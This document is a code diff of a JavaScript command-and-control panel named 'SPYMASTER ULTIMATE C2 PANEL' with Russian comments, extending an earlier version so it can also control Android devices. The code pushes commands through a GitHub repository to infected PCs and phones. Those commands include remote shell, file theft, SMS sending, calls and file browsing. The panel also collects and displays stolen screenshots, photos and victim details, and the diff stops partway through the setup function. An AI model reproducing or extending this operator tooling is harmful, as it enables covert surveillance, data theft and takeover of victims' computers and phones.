@@ -1,5 +1,6 @@
-// ============= SPYMASTER C2 PANEL - СКРИНШОТЫ КАК КАРТИНКИ =============
+// ============= SPYMASTER ULTIMATE C2 PANEL =============
 // АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ
+// ВЕРСИЯ: 4.0 (PC + ANDROID)
 
 // ============= КОНФИГУРАЦИЯ =============
 let GITHUB_USERNAME = "gitnikaaaa";
@@ -41,14 +42,24 @@ const HEADERS = {
     "Accept": "application/vnd.github.v3+json"
 };
 
-let clients = [];
-let seenFiles = [];
-let autoRefresh = null;
-let currentClient = "all";
+// PC переменные
+let pcClients = [];
+let pcSeenFiles = [];
+let pcAutoRefresh = null;
+let pcCurrentClient = "all";
+
+// Android переменные
+let androidDevices = [];
+let androidSeenFiles = [];
+let androidAutoRefresh = null;
+let androidCurrentDevice = "all";
+
+let currentMode = "pc";
 
 // ============= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =============
-function addLog(message, type = "system") {
-    const logContainer = document.getElementById("logContainer");
+function addLog(message, type = "system", isAndroid = false) {
+    const containerId = isAndroid ? "androidLogContainer" : "logContainer";
+    const logContainer = document.getElementById(containerId);
     if (!logContainer) return;
     const time = new Date().toLocaleTimeString();
     const logEntry = document.createElement("div");
@@ -80,28 +91,26 @@ function showNotification(message, type = "info") {
     setTimeout(() => notification.remove(), 3000);
 }
 
-// ============= ПРОВЕРКА ЯВЛЯЕТСЯ ЛИ СТРОКА BASE64 ИЗОБРАЖЕНИЕМ =============
 function isBase64Image(str) {
     if (!str || typeof str !== 'string') return false;
-    // Проверяем сигнатуру PNG (iVBORw0KGgo) или JPG (/9j/4AAQ)
     return str.startsWith('iVBORw0KGgo') || str.startsWith('/9j/4AAQ');
 }
 
-function isImageFile(filename) {
-    return filename.endsWith('.png') || filename.endsWith('.jpg') || filename.endsWith('.jpeg');
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
 }
 
-// ============= ОТПРАВКА КОМАНД =============
-async function sendCommand(command, clientId = null) {
-    if (!command) return;
-    
-    const targetClient = clientId || currentClient || "all";
+// ============= ОТПРАВКА КОМАНД (ОБЩАЯ) =============
+async function sendCommandToGithub(command, isAndroid = false) {
+    const targetClient = isAndroid ? (androidCurrentDevice || "all") : (pcCurrentClient || "all");
     let finalCommand = command;
     if (targetClient !== "all") {
         finalCommand = `@${targetClient} ${command}`;
     }
     
-    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system");
+    addLog(`📨 ОТПРАВКА: ${finalCommand}`, "system", isAndroid);
     
     try {
         let response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
@@ -132,41 +141,79 @@ async function sendCommand(command, clientId = null) {
         });
         
         if (putResponse.status === 200 || putResponse.status === 201) {
-            addLog(`✅ ОТПРАВЛЕНО: ${command}`, "success");
+            addLog(`✅ ОТПРАВЛЕНО: ${command}`, "success", isAndroid);
             showNotification(`✅ ${command}`, "success");
+            return true;
         } else {
-            addLog(`❌ ОШИБКА: ${putResponse.status}`, "error");
+            addLog(`❌ ОШИБКА: ${putResponse.status}`, "error", isAndroid);
+            return false;
         }
-        
     } catch (error) {
-        addLog(`❌ ОШИБКА: ${error.message}`, "error");
+        addLog(`❌ ОШИБКА: ${error.message}`, "error", isAndroid);
+        return false;
     }
 }
 
-// ============= ОБРАБОТКА СКРИНШОТА (base64 -> картинка) =============
-function displayScreenshot(base64Data, filename) {
-    const grid = document.getElementById("screensGrid");
+// ============= ПАРСИНГ КЛИЕНТОВ =============
+function parseClientInfo(content, isAndroid = false) {
+    if (content.includes("[Connected]") || content.includes("PC:") || content.includes("Device:")) {
+        let pcMatch = content.match(/PC:\s*([^\n]+)/);
+        let deviceMatch = content.match(/Device:\s*([^\n]+)/);
+        let modelMatch = content.match(/MODEL:\s*([^\n]+)/i);
+        
+        if (isAndroid && (deviceMatch || modelMatch)) {
+            const deviceId = deviceMatch ? deviceMatch[1].trim() : (modelMatch ? modelMatch[1].trim() : "Unknown");
+            if (!androidDevices.find(d => d.id === deviceId)) {
+                androidDevices.push({
+                    id: deviceId,
+                    info: content.substring(0, 200),
+                    firstSeen: new Date().toLocaleString()
+                });
+                updateAndroidDevicesList();
+                addLog(`📱 НОВОЕ ANDROID УСТРОЙСТВО: ${deviceId}`, "client", true);
+                showNotification(`Новое Android устройство: ${deviceId}`, "success");
+            }
+        } else if (pcMatch) {
+            const clientId = pcMatch[1].trim();
+            const userMatch = content.match(/User:\s*([^\n]+)/);
+            const userName = userMatch ? userMatch[1].trim() : "Unknown";
+            
+            if (!pcClients.find(c => c.id === clientId)) {
+                pcClients.push({
+                    id: clientId,
+                    user: userName,
+                    firstSeen: new Date().toLocaleString()
+                });
+                updatePCClientsList();
+                addLog(`💻 НОВЫЙ PC КЛИЕНТ: ${clientId} (${userName})`, "client", false);
+                showNotification(`Новый PC клиент: ${clientId}`, "success");
+            }
+        }
+    }
+}
+
+// ============= ОТОБРАЖЕНИЕ СКРИНШОТА =============
+function displayScreenshot(base64Data, filename, isAndroid = false) {
+    const gridId = isAndroid ? "androidPhotosGrid" : "screensGrid";
+    const grid = document.getElementById(gridId);
     if (!grid) return;
     
-    // Создаём карточку
     const card = document.createElement("div");
     card.className = "screenshot-card";
-    card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:8px;overflow:hidden;background:#0a0e27;transition:transform 0.2s";
+    card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:10px;overflow:hidden;background:#0a0e27;transition:transform 0.2s";
     card.onmouseover = () => card.style.transform = "scale(1.02)";
     card.onmouseout = () => card.style.transform = "scale(1)";
     
-    // Создаём изображение из base64
     const img = document.createElement("img");
     img.src = `data:image/png;base64,${base64Data}`;
     img.style.cssText = "width:100%;height:150px;object-fit:cover;background:#0a0e27";
     
-    // Обработчик клика для увеличения
     card.onclick = () => {
         const modal = document.createElement("div");
-        modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;display:flex;justify-content:center;align-items:center;cursor:pointer";
+        modal.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;display:flex;justify-content:center;align-items:center;cursor:pointer";
         const modalImg = document.createElement("img");
         modalImg.src = `data:image/png;base64,${base64Data}`;
-        modalImg.style.cssText = "max-width:90%;max-height:90%;border:2px solid #00ff41";
+        modalImg.style.cssText = "max-width:90%;max-height:90%;border:2px solid #00ff41;border-radius:10px";
         modal.appendChild(modalImg);
         modal.onclick = () => modal.remove();
         document.body.appendChild(modal);
@@ -179,20 +226,18 @@ function displayScreenshot(base64Data, filename) {
     card.appendChild(img);
     card.appendChild(info);
     
-    // Добавляем в начало сетки
     if (grid.children.length === 0 || (grid.children[0] && grid.children[0].classList && grid.children[0].classList.contains("empty-message"))) {
         grid.innerHTML = "";
     }
     grid.insertBefore(card, grid.firstChild);
     
-    // Ограничиваем количество (оставляем последние 20)
     while (grid.children.length > 20) {
         grid.removeChild(grid.lastChild);
     }
 }
 
 // ============= ЗАГРУЗКА РЕЗУЛЬТАТОВ =============
-async function loadResults() {
+async function loadResults(isAndroid = false) {
     try {
         const response = await fetch(API_URL, { headers: HEADERS });
         if (!response.ok) return;
@@ -200,78 +245,54 @@ async function loadResults() {
         const files = await response.json();
         if (!Array.isArray(files)) return;
         
-        // Разделяем файлы по типам
         const results = files.filter(f => f.name.startsWith("result_") && f.name.endsWith(".txt"));
-        const screenshotFiles = files.filter(f => f.name.startsWith("screenshot_") && (f.name.endsWith(".png") || f.name.endsWith(".txt")));
+        const screenshotFiles = files.filter(f => f.name.startsWith("screenshot_"));
+        const photoFiles = files.filter(f => f.name.startsWith("photo_"));
         const fileDownloads = files.filter(f => f.name.startsWith("file_"));
         
-        // Обновляем статистику
-        const resultsCount = document.getElementById("resultsCount");
-        const screensCount = document.getElementById("screensCount");
-        const clientsCount = document.getElementById("clientsCount");
-        if (resultsCount) resultsCount.innerText = results.length;
-        if (screensCount) screensCount.innerText = screenshotFiles.length;
-        if (clientsCount) clientsCount.innerText = clients.length;
+        if (isAndroid) {
+            document.getElementById("androidDevicesCount").innerText = androidDevices.length;
+            document.getElementById("androidGpsCount").innerText = screenshotFiles.length;
+        } else {
+            document.getElementById("resultsCount").innerText = results.length;
+            document.getElementById("screensCount").innerText = screenshotFiles.length;
+            document.getElementById("clientsCount").innerText = pcClients.length;
+        }
         
-        // ============= ОБРАБОТКА РЕЗУЛЬТАТОВ (result_xxx.txt) =============
-        for (const file of results) {
-            if (!seenFiles.includes(file.name)) {
-                seenFiles.push(file.name);
+        // Обработка результатов
+        const allResultFiles = isAndroid ? [...results, ...photoFiles] : results;
+        for (const file of allResultFiles) {
+            const seenList = isAndroid ? androidSeenFiles : pcSeenFiles;
+            if (!seenList.includes(file.name)) {
+                seenList.push(file.name);
                 const content = await fetch(file.download_url).then(r => r.text());
-                addLog(`📥 ${file.name}`, "result");
-                
-                // Показываем первые строки результата
-                const lines = content.split('\n').slice(0, 10);
+                addLog(`📥 ${file.name}`, "result", isAndroid);
+                const lines = content.split('\n').slice(0, 5);
                 for (const line of lines) {
-                    if (line.trim()) addLog(`   ${line.substring(0, 150)}`, "result");
+                    if (line.trim()) addLog(`   ${line.substring(0, 150)}`, "result", isAndroid);
                 }
-                
-                // ПАРСИНГ КЛИЕНТА из результата
-                let pcMatch = content.match(/PC:\s*([^\n]+)/);
-                if (!pcMatch) pcMatch = content.match(/\[Connected\]\s*PC:\s*([^\n]+)/i);
-                if (!pcMatch) pcMatch = content.match(/COMPUTERNAME[=:]\s*([^\n]+)/i);
-                
-                if (pcMatch) {
-                    const clientId = pcMatch[1].trim();
-                    const userMatch = content.match(/User:\s*([^\n]+)/);
-                    const userName = userMatch ? userMatch[1].trim() : "Unknown";
-                    
-                    if (!clients.find(c => c.id === clientId)) {
-                        clients.push({
-                            id: clientId,
-                            user: userName,
-                            firstSeen: new Date().toLocaleString()
-                        });
-                        updateClientsList();
-                        addLog(`💻 НОВЫЙ КЛИЕНТ: ${clientId} (${userName})`, "client");
-                        showNotification(`Новый клиент: ${clientId}`, "success");
-                    }
-                }
+                parseClientInfo(content, isAndroid);
             }
         }
         
-        // ============= ОБРАБОТКА СКРИНШОТОВ =============
-        for (const file of screenshotFiles) {
-            if (!seenFiles.includes(file.name)) {
-                seenFiles.push(file.name);
-                
+        // Обработка скриншотов/фото
+        const allImages = isAndroid ? photoFiles : screenshotFiles;
+        for (const file of allImages) {
+            const seenList = isAndroid ? androidSeenFiles : pcSeenFiles;
+            if (!seenList.includes(file.name)) {
+                seenList.push(file.name);
                 const content = await fetch(file.download_url).then(r => r.text());
                 
-                // Проверяем, является ли содержимое base64 изображением
                 if (isBase64Image(content)) {
-                    addLog(`📸 СКРИНШОТ: ${file.name} (base64 -> картинка)`, "success");
-                    displayScreenshot(content, file.name);
-                    showNotification(`Скриншот получен!`, "success");
-                } 
-                // Если это PNG файл
-                else if (file.name.endsWith('.png')) {
-                    addLog(`📸 СКРИНШОТ: ${file.name} (PNG файл)`, "success");
-                    // Отображаем как обычную картинку
-                    const grid = document.getElementById("screensGrid");
+                    addLog(`📸 ${file.name}`, "success", isAndroid);
+                    displayScreenshot(content, file.name, isAndroid);
+                } else if (file.name.endsWith('.png')) {
+                    addLog(`📸 ${file.name}`, "success", isAndroid);
+                    const gridId = isAndroid ? "androidPhotosGrid" : "screensGrid";
+                    const grid = document.getElementById(gridId);
                     if (grid) {
                         const card = document.createElement("div");
                         card.className = "screenshot-card";
-                        card.style.cssText = "cursor:pointer;border:1px solid #00ff41;border-radius:8px;overflow:hidden;background:#0a0e27";
                         const img = document.createElement("img");
                         img.src = file.download_url + "?t=" + Date.now();
                         img.style.cssText = "width:100%;height:150px;object-fit:cover";
@@ -287,86 +308,104 @@ async function loadResults() {
                         grid.insertBefore(card, grid.firstChild);
                     }
                 }
-                // Текстовый скриншот (костыль)
-                else {
-                    addLog(`📸 СКРИНШОТ (текст): ${file.name}`, "result");
-                    addLog(`   ${content.substring(0, 200)}`, "result");
-                }
             }
         }
         
-        // ============= ОБНОВЛЕНИЕ СПИСКА ФАЙЛОВ =============
-        const filesList = document.getElementById("filesList");
-        if (filesList) {
-            if (fileDownloads.length > 0) {
-                filesList.innerHTML = "";
-                for (const file of fileDownloads.slice(-20).reverse()) {
-                    const item = document.createElement("div");
-                    item.className = "file-item";
-                    item.style.cssText = "background:#0a0e27;border:1px solid #00ff41;border-radius:5px;padding:10px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center";
-                    item.innerHTML = `
-                        <span style="font-size:12px">📄 ${file.name}</span>
-                        <button class="file-download" onclick="window.open('${file.download_url}', '_blank')" style="background:#1a1f4e;border:none;color:#00ff41;padding:5px10px;cursor:pointer;border-radius:4px">⬇️ СКАЧАТЬ</button>
-                    `;
-                    filesList.appendChild(item);
+        // Обновление списка файлов для PC
+        if (!isAndroid) {
+            const filesList = document.getElementById("filesList");
+            if (filesList) {
+                if (fileDownloads.length > 0) {
+                    filesList.innerHTML = "";
+                    for (const file of fileDownloads.slice(-20).reverse()) {
+                        const item = document.createElement("div");
+                        item.className = "file-item";
+                        item.innerHTML = `
+                            <span>📄 ${file.name}</span>
+                            <button class="file-download" onclick="window.open('${file.download_url}', '_blank')">⬇️ СКАЧАТЬ</button>
+                        `;
+                        filesList.appendChild(item);
+                    }
+                } else {
+                    filesList.innerHTML = '<div class="empty-message">📭 Нет загруженных файлов</div>';
                 }
-            } else {
-                filesList.innerHTML = '<div class="empty-message" style="text-align:center;padding:40px;color:#444">📭 Нет загруженных файлов</div>';
             }
         }
         
     } catch (error) {
-        addLog(`❌ Ошибка загрузки: ${error.message}`, "error");
+        addLog(`❌ Ошибка загрузки: ${error.message}`, "error", isAndroid);
     }
 }
 
-// ============= ОБНОВЛЕНИЕ СПИСКА КЛИЕНТОВ =============
-function updateClientsList() {
-    // Обновляем селект
+// ============= ОБНОВЛЕНИЕ СПИСКОВ =============
+function updatePCClientsList() {
     const select = document.getElementById("clientSelect");
     if (select) {
         select.innerHTML = '<option value="all">📱 ВСЕ КЛИЕНТЫ</option>';
-        for (const client of clients) {
+        for (const client of pcClients) {
             select.innerHTML += `<option value="${client.id}">🖥️ ${client.id}</option>`;
         }
     }
     
-    // Обновляем вкладку "Клиенты"
     const clientsDiv = document.getElementById("clientsList");
     if (clientsDiv) {
-        if (clients.length > 0) {
+        if (pcClients.length > 0) {
             clientsDiv.innerHTML = "";
-            for (const client of clients) {
+            for (const client of pcClients) {
                 const card = document.createElement("div");
                 card.className = "client-card";
-                card.style.cssText = "background:#0a0e27;border:1px solid #00ff41;border-radius:8px;padding:12px;margin-bottom:10px;cursor:pointer;transition:all 0.2s";
-                card.onmouseover = () => card.style.background = "#1a1f4e";
-                card.onmouseout = () => card.style.background = "#0a0e27";
                 card.onclick = () => {
                     document.getElementById("clientSelect").value = client.id;
-                    currentClient = client.id;
-                    addLog(`🎯 ВЫБРАН КЛИЕНТ: ${client.id}`, "success");
+                    pcCurrentClient = client.id;
+                    addLog(`🎯 ВЫБРАН PC КЛИЕНТ: ${client.id}`, "success");
                 };
                 card.innerHTML = `
-                    <div style="font-weight:bold;font-size:14px">🖥️ ${escapeHtml(client.id)}</div>
+                    <div style="font-weight:bold">🖥️ ${escapeHtml(client.id)}</div>
                     <div style="font-size:11px;color:#888">👤 ${escapeHtml(client.user)}</div>
                     <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(client.firstSeen)}</div>
                 `;
                 clientsDiv.appendChild(card);
             }
         } else {
-            clientsDiv.innerHTML = '<div class="empty-message" style="text-align:center;padding:40px;color:#444">💤 Нет подключенных клиентов</div>';
+            clientsDiv.innerHTML = '<div class="empty-message">💤 Нет подключенных клиентов</div>';
         }
     }
 }
 
-function escapeHtml(text) {
-    const div = document.createElement('div');
-    div.textContent = text;
-    return div.innerHTML;
+function updateAndroidDevicesList() {
+    const select = document.getElementById("androidClientSelect");
+    if (select) {
+        select.innerHTML = '<option value="all">📱 ВСЕ УСТРОЙСТВА</option>';
+        for (const device of androidDevices) {
+            select.innerHTML += `<option value="${device.id}">📱 ${device.id}</option>`;
+        }
+    }
+    
+    const devicesDiv = document.getElementById("androidDevicesList");
+    if (devicesDiv) {
+        if (androidDevices.length > 0) {
+            devicesDiv.innerHTML = "";
+            for (const device of androidDevices) {
+                const card = document.createElement("div");
+                card.className = "client-card";
+                card.onclick = () => {
+                    document.getElementById("androidClientSelect").value = device.id;
+                    androidCurrentDevice = device.id;
+                    addLog(`🎯 ВЫБРАНО ANDROID УСТРОЙСТВО: ${device.id}`, "success", true);
+                };
+                card.innerHTML = `
+                    <div style="font-weight:bold">📱 ${escapeHtml(device.id)}</div>
+                    <div style="font-size:10px;color:#00ff41">🕐 Подключен: ${escapeHtml(device.firstSeen)}</div>
+                `;
+                devicesDiv.appendChild(card);
+            }
+        } else {
+            devicesDiv.innerHTML = '<div class="empty-message">💤 Нет подключенных устройств</div>';
+        }
+    }
 }
 
-// ============= ОСТАЛЬНЫЕ ФУНКЦИИ =============
+// ============= ОЧИСТКА КОМАНД =============
 async function clearCommands() {
     try {
         const response = await fetch(`${API_URL}/commands.txt`, { headers: HEADERS });
@@ -382,125 +421,210 @@ async function clearCommands() {
                     branch: "main"
                 })
             });
-            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success");
+            addLog("🗑 КОМАНДЫ ОЧИЩЕНЫ", "success", false);
         }
     } catch (error) {
-        addLog(`❌ Ошибка очистки: ${error.message}`, "error");
+        addLog(`❌ Ошибка очистки: ${error.message}`, "error", false);
     }
 }
 
+// ============= ТЕСТ ПОДКЛЮЧЕНИЯ =============
 async function testConnection() {
-    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ...", "system");
+    addLog("🔌 ПРОВЕРКА ПОДКЛЮЧЕНИЯ...", "system", false);
     try {
         const response = await fetch("https://api.github.com/user", { headers: HEADERS });
         if (response.ok) {
             const user = await response.json();
-            addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success");
+            addLog(`✅ ПОДКЛЮЧЕНО! ПОЛЬЗОВАТЕЛЬ: ${user.login}`, "success", false);
             const indicator = document.getElementById("statusIndicator");
             const statusText = document.getElementById("statusText");
             if (indicator) indicator.classList.add("online");
             if (statusText) statusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
+            
+            // Также тестируем для Android
+            const androidIndicator = document.getElementById("androidStatusIndicator");
+            const androidStatusText = document.getElementById("androidStatusText");
+            if (androidIndicator) androidIndicator.classList.add("online");
+            if (androidStatusText) androidStatusText.innerHTML = `✅ ПОДКЛЮЧЕН | ${user.login}`;
+            
             return true;
         } else {
-            addLog(`❌ ОШИБКА: ${response.status}`, "error");
+            addLog(`❌ ОШИБКА: ${response.status}`, "error", false);
             return false;
         }
     } catch (error) {
-        addLog(`❌ ОШИБКА: ${error.message}`, "error");
+        addLog(`❌ ОШИБКА: ${error.message}`, "error", false);
         return false;
     }
 }
 
+// ============= АВТООБНОВЛЕНИЕ =============
 function startAutoRefresh() {
-    if (autoRefresh) clearInterval(autoRefresh);
-    autoRefresh = setInterval(() => loadResults(), 5000);
-    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (5 сек)", "system");
+    if (pcAutoRefresh) clearInterval(pcAutoRefresh);
+    if (androidAutoRefresh) clearInterval(androidAutoRefresh);
+    
+    pcAutoRefresh = setInterval(() => loadResults(false), 5000);
+    androidAutoRefresh = setInterval(() => loadResults(true), 5000);
+    addLog("🔄 АВТООБНОВЛЕНИЕ ЗАПУЩЕНО (5 сек)", "system", false);
+}
+
+// ============= ПЕРЕКЛЮЧЕНИЕ РЕЖИМОВ =============
+function switchMode(mode) {
+    currentMode = mode;
+    document.querySelectorAll('.mode-content').forEach(el => el.classList.remove('active'));
+    document.getElementById(`${mode}Mode`).classList.add('active');
+    document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
+    document.querySelector(`.mode-btn[data-mode="${mode}"]`).classList.add('active');
 }
 
 // ============= ИНИЦИАЛИЗАЦИЯ =============
 function init() {
-    addLog("🐀 SPYMASTER C2 PANEL v3.0", "system");
-    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system");
+    addLog("🐀 SPYMASTER ULTIMATE C2 PANEL v4.0 ЗАПУЩЕН", "system", false);
+    addLog("🐀 АВТОР: КРЫСА ГУБЕРНАТОРСКАЯ", "system", false);
+    addLog("📱 ANDROID ПАНЕЛЬ ГОТОВА К РАБОТЕ", "system", true);
     
-    // Стили
+    // Добавляем стили
     if (!document.querySelector("#dynamic-styles")) {
         const style = document.createElement('style');
         style.id = "dynamic-styles";
         style.textContent = `
             @keyframes fadeInOut { 0% { opacity: 0; transform: translateX(20px); } 15% { opacity: 1; transform: translateX(0); } 85% { opacity: 1; transform: translateX(0); } 100% { opacity: 0; transform: translateX(20px); } }
+            .log-entry { background: rgba(10,14,39,0.8); border-radius: 5px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
             .log-entry.success { border-left-color: #00ff41; color: #00ff41; }
             .log-entry.error { border-left-color: #ff4444; color: #ff8888; }
             .log-entry.system { border-left-color: #ffaa00; color: #ffaa88; }
             .log-entry.client { border-left-color: #00aaff; color: #88ccff; }
             .log-entry.result { border-left-color: #aa44ff; color: #cc88ff; }
-            .log-entry { background: #0a0e27; border-radius: 3px; margin-bottom: 5px; padding: 5px 10px; border-left: 3px solid; font-family: monospace; font-size: 12px; }
-            .screenshot-card { cursor: pointer; border: 1px solid #00ff41; border-radius: 5px; overflow: hidden; background: #0a0e27; transition: transform 0.2s; }
-            .screenshot-card:hover { transform: scale(1.02); }
-            .client-card { cursor: pointer; transition: all 0.2s; }
-            .client-card:hover { background: #1a1f4e !important; transform: translateX(5px); }
-            .file-item { background: #0a0e27; border: 1px solid #00ff41; border-radius: 5px; padding: 10px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
-            .file-download { background: #1a1f4e; border: none; color: #00ff41; padding: 5px 10px; cursor: pointer; border-radius: 4px; }
+            .screenshot-card { cursor: pointer; border: 1px solid #00ff41; border-radius: 10px; overflow: hidden; background: #0a0e27; transition: transform 0.2s; }
+            .screenshot-card:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(0,255,65,0.3); }
+            .client-card { background: #0a0e27; border: 1px solid #00ff41; border-radius: 10px; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: all 0.3s; }
+            .client-card:hover { background: #1a1f4e; transform: translateX(5px); }
+            .file-item { background: #0a0e27; border: 1px solid #00ff41; border-radius: 8px; padding: 10px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+            .file-download { background: #1a1f4e; border: none; color: #00ff41; padding: 5px 10px; cursor: pointer; border-radius: 5px; }
             .empty-message { text-align: center; padding: 40px; color: #444; }
+            .help-card { background: #0a0e27; border: 1px solid #00ff41; border-radius: 8px; padding: 10px; font-size: 12px; }
+            .help-card code { color: #ffaa00; }
         `;
         document.head.appendChild(style);
     }
     
     testConnection();
     startAutoRefresh();
-    loadResults();
+    loadResults(false);
+    loadResults(true);
     
-    // Кнопки
-    document.querySelectorAll('.cmd-btn, .cmd-small').forEach(btn => {
+    // ============= PC КНОПКИ =============
+    document.querySelectorAll('#pcMode .cmd-btn, #pcMode .cmd-small').forEach(btn => {
+        if (btn.id !== 'sendCustomBtn' && btn.id !== 'downloadBtn' && btn.id !== 'shellBtn') {
+            btn.onclick = () => {
+                const cmd = btn.getAttribute('data-cmd');
+                if (cmd) sendCommandToGithub(cmd, false);
+            };
+        }
+    });
+    
+    document.getElementById("sendCustomBtn")?.addEventListener("click", () => {
+        const input = document.getElementById("customCmd");
+        if (input && input.value) {
+            sendCommandToGithub(input.value, false);
+            input.value = '';
+        }
+    });
+    
+    document.getElementById("downloadBtn")?.addEventListener("click", () => {
+        const input = document.getElementById("downloadPath");
+        if (input && input.value) {
+            sendCommandToGithub(`/download ${input.value}`, false);
+        }
+    });
+    
+    document.getElementById("shellBtn")?.addEventListener("click", () => {
+        const input = document.getElementById("shellCmd");
+        if (input && input.value) {
+            sendCommandToGithub(`/cmd ${input.value}`, false);
+        }
+    });
+    
+    document.getElementById("clearCommandsBtn")?.addEventListener("click", clearCommands);
+    document.getElementById("refreshBtn")?.addEventListener("click", () => loadResults(false));
+    
+    document.getElementById("clientSelect")?.addEventListener("change", (e) => {
+        pcCurrentClient = e.target.value;
+        addLog(`🎯 ВЫБРАН PC КЛИЕНТ: ${pcCurrentClient === "all" ? "ВСЕ" : pcCurrentClient}`, "success", false);
+    });
+    
+    // ============= ANDROID КНОПКИ =============
+    document.querySelectorAll('#androidMode .cmd-btn').forEach(btn => {
         btn.onclick = () => {
-            const cmd = btn.getAttribute('data-cmd');
-            if (cmd) sendCommand(cmd);
+            const cmd = btn.getAttribute('data-android-cmd');
+            if (cmd) sendCommandToGithub(cmd, true);
         };
     });
     
-    // Кастомная команда
-    const sendBtn = document.getElementById('sendCustomBtn');
-    if (sendBtn) {
-        sendBtn.onclick = () => {
-            const input = document.getElementById('customCmd');
-            if (input && input.value) {
-                sendCommand(input.value);
-                input.value = '';
-            }
+    document.getElementById("androidSendCustomBtn")?.addEventListener("click", () => {
+        const input = document.getElementById("androidCustomCmd");
+        if (input && input.value) {
+            sendCommandToGithub(input.value, true);
+            input.value = '';
+        }
+    });
+    
+    document.getElementById("androidSmsBtn")?.addEventListener("click", () => {
+        const number = document.getElementById("androidSmsNumber")?.value;
+        const text = document.getElementById("androidSmsText")?.value;
+        if (number && text) {
+            sendCommandToGithub(`/sms:${number} ${text}`, true);
+        }
+    });
+    
+    document.getElementById("androidCallBtn")?.addEventListener("click", () => {
+        const number = document.getElementById("androidCallNumber")?.value;
+        if (number) {
+            sendCommandToGithub(`/call:${number}`, true);
+        }
+    });
+    
+    document.getElementById("androidFilesBtn")?.addEventListener("click", () => {
+        const path = document.getElementById("androidFilePath")?.value || "/sdcard";
+        sendCommandToGithub(`/files ${path}`, true);
+    });
+    
+    document.getElementById("androidShellBtn")?.addEventListener("click", () => {
+        const cmd = document.getElementById("androidShellCmd")?.value;
+        if (cmd) {
+            sendCommandToGithub(`/cmd ${cmd}`, true);
+        }
+    });
+    
+    document.getElementById("androidClientSelect")?.addEventListener("change", (e) => {
+        androidCurrentDevice = e.target.value;
+        addLog(`🎯 ВЫБРАНО ANDROID УСТРОЙСТВО: ${androidCurrentDevice === "all" ? "ВСЕ" : androidCurrentDevice}`, "success", true);
+    });
+    
+    // ============= ВКЛАДКИ PC =============
+    document.querySelectorAll('#pcMode .tab-btn').forEach(btn => {
+        btn.onclick = () => {
+            document.querySelectorAll('#pcMode .tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('#pcMode .tab-content').forEach(t => t.classList.remove('active'));
+            btn.classList.add('active');
+            const tab = document.getElementById(`${btn.getAttribute('data-tab')}Tab`);
+            if (tab) tab.classList.add('active');
         };
-    }
+    });
     
-    // Download
-    const downloadBtn = document.getElementById('downloadBtn');
-    if (downloadBtn) {
-        downloadBtn.onclick = () => {
-            const input = document.getElementById('downloadPath');
-            if (input && input.value) {
-                sendCommand(`/download ${input.value}`);
-            }
+    // ============= ВКЛАДКИ ANDROID =============
+    document.querySelectorAll('#androidMode .tab-btn').forEach(btn => {
+        btn.onclick = () => {
+            document.querySelectorAll('#androidMode .tab-btn').forEach(b => b.classList.remove('active'));
+            document.querySelectorAll('#androidMode .tab-content').forEach(t => t.classList.remove('active'));
+            btn.classList.add('active');
+            const tab = document.getElementById(`android${btn.getAttribute('data-android-tab').charAt(0).toUpperCase() + btn.getAttribute('data-android-tab').slice(1)}Tab`);
+            if (tab) tab.classList.add('active');
         };
-    }
+    });
     
-    // Shell
-    const shellBtn = document.getElementById('shellBtn');
-    if (shellBtn) {
-        shellBtn.onclick = () => {
-            const input = document.getElementById('shellCmd');
-            if (input && input.value) {
-                sendCommand(`/cmd ${input.value}`);
-            }
-        };
-    }
-    
-    // Очистка команд
-    const clearBtn = document.getElementById('clearCommandsBtn');
-    if (clearBtn) clearBtn.onclick = () => clearCommands();
-    
-    // Обновление
-    const refreshBtn = document.getElementById('refreshBtn');
-    if (refreshBtn) refreshBtn.onclick = () => loadResults();
-    
-    // Очистка всего
-    const clearAllBtn = document.getElementById('clearAllBtn');
+    // ============= ОЧИСТКА ВСЕГО =============
+    const clearAllBtn = document.getElementById("clearAllBtn");
     if (clearAllBtn) {
         clearAllBtn.onclick = () => {
             if (confirm("💣 Удалить ВСЕ файлы? Файлы сайта НЕ будут затронуты!")) {
@@ -520,37 +644,28 @@ function init() {
                             deleted++;
                             await new Promise(r => setTimeout(r, 100));
                         }
-                        addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success");
-                        seenFiles = [];
-                        clients = [];
-                        loadResults();
+                        addLog(`💣 УДАЛЕНО: ${deleted} файлов`, "success", false);
+                        pcSeenFiles = [];
+                        androidSeenFiles = [];
+                        pcClients = [];
+                        androidDevices = [];
+                        loadResults(false);
+                        loadResults(true);
                     }
                 })();
             }
         };
     }
     
-    // Выбор клиента
-    const clientSelect = document.getElementById('clientSelect');
-    if (clientSelect) {
-        clientSelect.onchange = (e) => {
-            currentClient = e.target.value;
-            addLog(`🎯 ВЫБРАН: ${currentClient === "all" ? "ВСЕ КЛИЕНТЫ" : currentClient}`, "system");
-        };
-    }
-    
-    // Вкладки
-    document.querySelectorAll('.tab-btn').forEach(btn => {
